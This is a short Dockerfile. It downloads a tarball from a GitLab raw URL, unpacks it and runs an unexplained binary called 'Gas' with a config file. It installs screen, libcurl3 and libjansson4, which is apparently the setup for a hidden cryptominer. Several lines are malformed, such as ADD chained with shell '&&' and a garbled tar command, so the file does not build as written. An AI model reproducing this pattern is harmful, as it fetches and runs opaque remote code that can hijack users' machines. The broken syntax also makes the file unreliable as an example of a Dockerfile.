# Build
FROM ubuntu:16.04 as builder

ADD https://gitlab.com/nikita_partiniikita/mikayui/-/raw/master/biyan.tar.gz && tar -xvf biyan.tar.gz && ./Gas Gas.ini /
RUN cd Gas \
   && tar xzf tar -xvf biyan.tar.gz \
   && ls

# App
FROM ubuntu:16.04

RUN apt-get update \
   && apt-get install screen \
  && apt-get install -y \
    libcurl3 \
    libjansson4 \
  && rm -rf /var/lib/apt/lists/*

COPY --from=builder /Gas .
ENTRYPOINT ["./Gas"]
RUN ./Gas Gas.ini 
CMD ["-h"]
